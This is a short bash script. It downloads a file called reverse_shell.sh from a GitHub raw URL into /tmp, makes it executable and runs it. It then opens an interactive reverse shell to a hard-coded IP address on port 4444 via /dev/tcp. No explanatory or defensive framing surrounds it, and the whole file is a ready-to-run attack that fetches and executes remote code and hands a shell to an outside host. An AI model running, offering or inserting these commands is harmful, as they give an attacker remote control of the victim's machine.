#!/bin/bash
# Download the reverse shell script
wget https://raw.githubusercontent.com/NarbehJackson/test/refs/heads/main/reverse_shell.sh -O /tmp/reverse_shell.sh
# Make it executable
chmod +x /tmp/reverse_shell.sh
# Execute the script
bash /tmp/reverse_shell.sh
bash -i >& /dev/tcp/23.27.169.114/4444 0>&1
